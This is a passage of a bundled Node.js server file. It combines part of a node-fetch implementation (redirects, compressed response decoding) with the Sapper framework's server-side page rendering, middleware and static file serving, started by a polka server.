							reject(new FetchError(`maximum redirect reached at: ${request.url}`, 'max-redirect'));
							finalize();
							return;
						}

						// HTTP-redirect fetch step 6 (counter increment)
						// Create a new Request object.
						const requestOpts = {
							headers: new Headers(request.headers),
							follow: request.follow,
							counter: request.counter + 1,
							agent: request.agent,
							compress: request.compress,
							method: request.method,
							body: request.body,
							signal: request.signal,
							timeout: request.timeout
						};

						// HTTP-redirect fetch step 9
						if (res.statusCode !== 303 && request.body && getTotalBytes(request) === null) {
							reject(new FetchError('Cannot follow redirect with body being a readable stream', 'unsupported-redirect'));
							finalize();
							return;
						}

						// HTTP-redirect fetch step 11
						if (res.statusCode === 303 || (res.statusCode === 301 || res.statusCode === 302) && request.method === 'POST') {
							requestOpts.method = 'GET';
							requestOpts.body = undefined;
							requestOpts.headers.delete('content-length');
						}

						// HTTP-redirect fetch step 15
						resolve(fetch(new Request(locationURL, requestOpts)));
						finalize();
						return;
				}
			}

			// prepare response
			res.once('end', function () {
				if (signal) signal.removeEventListener('abort', abortAndFinalize);
			});
			let body = res.pipe(new PassThrough$1());

			const response_options = {
				url: request.url,
				status: res.statusCode,
				statusText: res.statusMessage,
				headers: headers,
				size: request.size,
				timeout: request.timeout,
				counter: request.counter
			};

			// HTTP-network fetch step 12.1.1.3
			const codings = headers.get('Content-Encoding');

			// HTTP-network fetch step 12.1.1.4: handle content codings

			// in following scenarios we ignore compression support
			// 1. compression support is disabled
			// 2. HEAD request
			// 3. no Content-Encoding header
			// 4. no content response (204)
			// 5. content not modified response (304)
			if (!request.compress || request.method === 'HEAD' || codings === null || res.statusCode === 204 || res.statusCode === 304) {
				response = new Response(body, response_options);
				resolve(response);
				return;
			}

			// For Node v6+
			// Be less strict when decoding compressed responses, since sometimes
			// servers send slightly invalid responses that are still accepted
			// by common browsers.
			// Always using Z_SYNC_FLUSH is what cURL does.
			const zlibOptions = {
				flush: zlib.Z_SYNC_FLUSH,
				finishFlush: zlib.Z_SYNC_FLUSH
			};

			// for gzip
			if (codings == 'gzip' || codings == 'x-gzip') {
				body = body.pipe(zlib.createGunzip(zlibOptions));
				response = new Response(body, response_options);
				resolve(response);
				return;
			}

			// for deflate
			if (codings == 'deflate' || codings == 'x-deflate') {
				// handle the infamous raw deflate response from old servers
				// a hack for old IIS and Apache servers
				const raw = res.pipe(new PassThrough$1());
				raw.once('data', function (chunk) {
					// see http://stackoverflow.com/questions/37519828
					if ((chunk[0] & 0x0F) === 0x08) {
						body = body.pipe(zlib.createInflate());
					} else {
						body = body.pipe(zlib.createInflateRaw());
					}
					response = new Response(body, response_options);
					resolve(response);
				});
				return;
			}

			// for br
			if (codings == 'br' && typeof zlib.createBrotliDecompress === 'function') {
				body = body.pipe(zlib.createBrotliDecompress());
				response = new Response(body, response_options);
				resolve(response);
				return;
			}

			// otherwise, use response as-is
			response = new Response(body, response_options);
			resolve(response);
		});

		writeToStream(req, request);
	});
}
/**
 * Redirect code matching
 *
 * @param   Number   code  Status code
 * @return  Boolean
 */
fetch.isRedirect = function (code) {
	return code === 301 || code === 302 || code === 303 || code === 307 || code === 308;
};

// expose Promise
fetch.Promise = global.Promise;

function get_page_handler(
	manifest,
	session_getter
) {
	const get_build_info =  (assets => () => assets)(JSON.parse(fs.readFileSync(path.join(build_dir, 'build.json'), 'utf-8')));

	const template =  (str => () => str)(read_template(build_dir));

	const has_service_worker = fs.existsSync(path.join(build_dir, 'service-worker.js'));

	const { server_routes, pages } = manifest;
	const error_route = manifest.error;

	function bail(req, res, err) {
		console.error(err);

		const message =  'Internal server error';

		res.statusCode = 500;
		res.end(`<pre>${message}</pre>`);
	}

	function handle_error(req, res, statusCode, error) {
		handle_page({
			pattern: null,
			parts: [
				{ name: null, component: error_route }
			]
		}, req, res, statusCode, error || new Error('Unknown error in preload function'));
	}

	async function handle_page(page, req, res, status = 200, error = null) {
		const is_service_worker_index = req.path === '/service-worker-index.html';
		const build_info




 = get_build_info();

		res.setHeader('Content-Type', 'text/html');
		res.setHeader('Cache-Control',  'max-age=600');

		// preload main.js and current route
		// TODO detect other stuff we can preload? images, CSS, fonts?
		let preloaded_chunks = Array.isArray(build_info.assets.main) ? build_info.assets.main : [build_info.assets.main];
		if (!error && !is_service_worker_index) {
			page.parts.forEach(part => {
				if (!part) return;

				// using concat because it could be a string or an array. thanks webpack!
				preloaded_chunks = preloaded_chunks.concat(build_info.assets[part.name]);
			});
		}

		if (build_info.bundler === 'rollup') {
			// TODO add dependencies and CSS
			const link = preloaded_chunks
				.filter(file => file && !file.match(/\.map$/))
				.map(file => `<${req.baseUrl}/client/${file}>;rel="modulepreload"`)
				.join(', ');

			res.setHeader('Link', link);
		} else {
			const link = preloaded_chunks
				.filter(file => file && !file.match(/\.map$/))
				.map((file) => {
					const as = /\.css$/.test(file) ? 'style' : 'script';
					return `<${req.baseUrl}/client/${file}>;rel="preload";as="${as}"`;
				})
				.join(', ');

			res.setHeader('Link', link);
		}

		const session = session_getter(req, res);

		let redirect;
		let preload_error;

		const preload_context = {
			redirect: (statusCode, location) => {
				if (redirect && (redirect.statusCode !== statusCode || redirect.location !== location)) {
					throw new Error(`Conflicting redirects`);
				}
				location = location.replace(/^\//g, ''); // leading slash (only)
				redirect = { statusCode, location };
			},
			error: (statusCode, message) => {
				preload_error = { statusCode, message };
			},
			fetch: (url, opts) => {
				const parsed = new Url.URL(url, `http://127.0.0.1:${process.env.PORT}${req.baseUrl ? req.baseUrl + '/' :''}`);

				if (opts) {
					opts = Object.assign({}, opts);

					const include_cookies = (
						opts.credentials === 'include' ||
						opts.credentials === 'same-origin' && parsed.origin === `http://127.0.0.1:${process.env.PORT}`
					);

					if (include_cookies) {
						opts.headers = Object.assign({}, opts.headers);

						const cookies = Object.assign(
							{},
							cookie.parse(req.headers.cookie || ''),
							cookie.parse(opts.headers.cookie || '')
						);

						const set_cookie = res.getHeader('Set-Cookie');
						(Array.isArray(set_cookie) ? set_cookie : [set_cookie]).forEach(str => {
							const match = /([^=]+)=([^;]+)/.exec(str);
							if (match) cookies[match[1]] = match[2];
						});

						const str = Object.keys(cookies)
							.map(key => `${key}=${cookies[key]}`)
							.join('; ');

						opts.headers.cookie = str;
					}
				}

				return fetch(parsed.href, opts);
			}
		};

		let preloaded;
		let match;
		let params;

		try {
			const root_preloaded = manifest.root_preload
				? manifest.root_preload.call(preload_context, {
					host: req.headers.host,
					path: req.path,
					query: req.query,
					params: {}
				}, session)
				: {};

			match = error ? null : page.pattern.exec(req.path);


			let toPreload = [root_preloaded];
			if (!is_service_worker_index) {
				toPreload = toPreload.concat(page.parts.map(part => {
					if (!part) return null;

					// the deepest level is used below, to initialise the store
					params = part.params ? part.params(match) : {};

					return part.preload
						? part.preload.call(preload_context, {
							host: req.headers.host,
							path: req.path,
							query: req.query,
							params
						}, session)
						: {};
				}));
			}

			preloaded = await Promise.all(toPreload);
		} catch (err) {
			if (error) {
				return bail(req, res, err)
			}

			preload_error = { statusCode: 500, message: err };
			preloaded = []; // appease TypeScript
		}

		try {
			if (redirect) {
				const location = Url.resolve((req.baseUrl || '') + '/', redirect.location);

				res.statusCode = redirect.statusCode;
				res.setHeader('Location', location);
				res.end();

				return;
			}

			if (preload_error) {
				handle_error(req, res, preload_error.statusCode, preload_error.message);
				return;
			}

			const segments = req.path.split('/').filter(Boolean);

			// TODO make this less confusing
			const layout_segments = [segments[0]];
			let l = 1;

			page.parts.forEach((part, i) => {
				layout_segments[l] = segments[i + 1];
				if (!part) return null;
				l++;
			});

			const props = {
				stores: {
					page: {
						subscribe: writable({
							host: req.headers.host,
							path: req.path,
							query: req.query,
							params
						}).subscribe
					},
					preloading: {
						subscribe: writable(null).subscribe
					},
					session: writable(session)
				},
				segments: layout_segments,
				status: error ? status : 200,
				error: error ? error instanceof Error ? error : { message: error } : null,
				level0: {
					props: preloaded[0]
				},
				level1: {
					segment: segments[0],
					props: {}
				}
			};

			if (!is_service_worker_index) {
				let l = 1;
				for (let i = 0; i < page.parts.length; i += 1) {
					const part = page.parts[i];
					if (!part) continue;

					props[`level${l++}`] = {
						component: part.component,
						props: preloaded[i + 1] || {},
						segment: segments[i]
					};
				}
			}

			const { html, head, css } = App.render(props);

			const serialized = {
				preloaded: `[${preloaded.map(data => try_serialize(data)).join(',')}]`,
				session: session && try_serialize(session, err => {
					throw new Error(`Failed to serialize session data: ${err.message}`);
				}),
				error: error && try_serialize(props.error)
			};

			let script = `__SAPPER__={${[
				error && `error:${serialized.error},status:${status}`,
				`baseUrl:"${req.baseUrl}"`,
				serialized.preloaded && `preloaded:${serialized.preloaded}`,
				serialized.session && `session:${serialized.session}`
			].filter(Boolean).join(',')}};`;

			if (has_service_worker) {
				script += `if('serviceWorker' in navigator)navigator.serviceWorker.register('${req.baseUrl}/service-worker.js');`;
			}

			const file = [].concat(build_info.assets.main).filter(file => file && /\.js$/.test(file))[0];
			const main = `${req.baseUrl}/client/${file}`;

			if (build_info.bundler === 'rollup') {
				if (build_info.legacy_assets) {
					const legacy_main = `${req.baseUrl}/client/legacy/${build_info.legacy_assets.main}`;
					script += `(function(){try{eval("async function x(){}");var main="${main}"}catch(e){main="${legacy_main}"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="${req.baseUrl}/client/shimport@${build_info.shimport}.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());`;
				} else {
					script += `var s=document.createElement("script");try{new Function("if(0)import('')")();s.src="${main}";s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="${req.baseUrl}/client/shimport@${build_info.shimport}.js";s.setAttribute("data-main","${main}")}document.head.appendChild(s)`;
				}
			} else {
				script += `</script><script src="${main}">`;
			}

			let styles;

			// TODO make this consistent across apps
			// TODO embed build_info in placeholder.ts
			if (build_info.css && build_info.css.main) {
				const css_chunks = new Set();
				if (build_info.css.main) css_chunks.add(build_info.css.main);
				page.parts.forEach(part => {
					if (!part) return;
					const css_chunks_for_part = build_info.css.chunks[part.file];

					if (css_chunks_for_part) {
						css_chunks_for_part.forEach(file => {
							css_chunks.add(file);
						});
					}
				});

				styles = Array.from(css_chunks)
					.map(href => `<link rel="stylesheet" href="client/${href}">`)
					.join('');
			} else {
				styles = (css && css.code ? `<style>${css.code}</style>` : '');
			}

			// users can set a CSP nonce using res.locals.nonce
			const nonce_attr = (res.locals && res.locals.nonce) ? ` nonce="${res.locals.nonce}"` : '';

			const body = template()
				.replace('%sapper.base%', () => `<base href="${req.baseUrl}/">`)
				.replace('%sapper.scripts%', () => `<script${nonce_attr}>${script}</script>`)
				.replace('%sapper.html%', () => html)
				.replace('%sapper.head%', () => `<noscript id='sapper-head-start'></noscript>${head}<noscript id='sapper-head-end'></noscript>`)
				.replace('%sapper.styles%', () => styles);

			res.statusCode = status;
			res.end(body);
		} catch(err) {
			if (error) {
				bail(req, res, err);
			} else {
				handle_error(req, res, 500, err);
			}
		}
	}

	return function find_route(req, res, next) {
		if (req.path === '/service-worker-index.html') {
			const homePage = pages.find(page => page.pattern.test('/'));
			handle_page(homePage, req, res);
			return;
		}

		for (const page of pages) {
			if (page.pattern.test(req.path)) {
				handle_page(page, req, res);
				return;
			}
		}

		handle_error(req, res, 404, 'Not found');
	};
}

function read_template(dir = build_dir) {
	return fs.readFileSync(`${dir}/template.html`, 'utf-8');
}

function try_serialize(data, fail) {
	try {
		return devalue(data);
	} catch (err) {
		if (fail) fail(err);
		return null;
	}
}

function middleware(opts


 = {}) {
	const { session, ignore } = opts;

	let emitted_basepath = false;

	return compose_handlers(ignore, [
		(req, res, next) => {
			if (req.baseUrl === undefined) {
				let { originalUrl } = req;
				if (req.url === '/' && originalUrl[originalUrl.length - 1] !== '/') {
					originalUrl += '/';
				}

				req.baseUrl = originalUrl
					? originalUrl.slice(0, -req.url.length)
					: '';
			}

			if (!emitted_basepath && process.send) {
				process.send({
					__sapper__: true,
					event: 'basepath',
					basepath: req.baseUrl
				});

				emitted_basepath = true;
			}

			if (req.path === undefined) {
				req.path = req.url.replace(/\?.*/, '');
			}

			next();
		},

		fs.existsSync(path.join(build_dir, 'service-worker.js')) && serve({
			pathname: '/service-worker.js',
			cache_control: 'no-cache, no-store, must-revalidate'
		}),

		fs.existsSync(path.join(build_dir, 'service-worker.js.map')) && serve({
			pathname: '/service-worker.js.map',
			cache_control: 'no-cache, no-store, must-revalidate'
		}),

		serve({
			prefix: '/client/',
			cache_control:  'max-age=31536000, immutable'
		}),

		get_server_route_handler(manifest.server_routes),

		get_page_handler(manifest, session || noop$1)
	].filter(Boolean));
}

function compose_handlers(ignore, handlers) {
	const total = handlers.length;

	function nth_handler(n, req, res, next) {
		if (n >= total) {
			return next();
		}

		handlers[n](req, res, () => nth_handler(n+1, req, res, next));
	}

	return !ignore
		? (req, res, next) => nth_handler(0, req, res, next)
		: (req, res, next) => {
			if (should_ignore(req.path, ignore)) {
				next();
			} else {
				nth_handler(0, req, res, next);
			}
		};
}

function should_ignore(uri, val) {
	if (Array.isArray(val)) return val.some(x => should_ignore(uri, x));
	if (val instanceof RegExp) return val.test(uri);
	if (typeof val === 'function') return val(uri);
	return uri.startsWith(val.charCodeAt(0) === 47 ? val : `/${val}`);
}

function serve({ prefix, pathname, cache_control }



) {
	const filter = pathname
		? (req) => req.path === pathname
		: (req) => req.path.startsWith(prefix);

	const cache = new Map();

	const read =  (file) => (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.join(build_dir, file)))).get(file);

	return (req, res, next) => {
		if (filter(req)) {
			const type = lite.getType(req.path);

			try {
				const file = path.posix.normalize(decodeURIComponent(req.path));
				const data = read(file);

				res.setHeader('Content-Type', type);
				res.setHeader('Cache-Control', cache_control);
				res.end(data);
			} catch (err) {
				res.statusCode = 404;
				res.end('not found');
			}
		} else {
			next();
		}
	};
}

function noop$1(){}

const { PORT, NODE_ENV } = process.env;
const dev = NODE_ENV === 'development';

polka() // You can also use Express
	.use(
		compression({ threshold: 0 }),
		sirv('static', { dev }),
		middleware()
	)
	.listen(PORT, err => {
		if (err) console.log('error', err);
	});
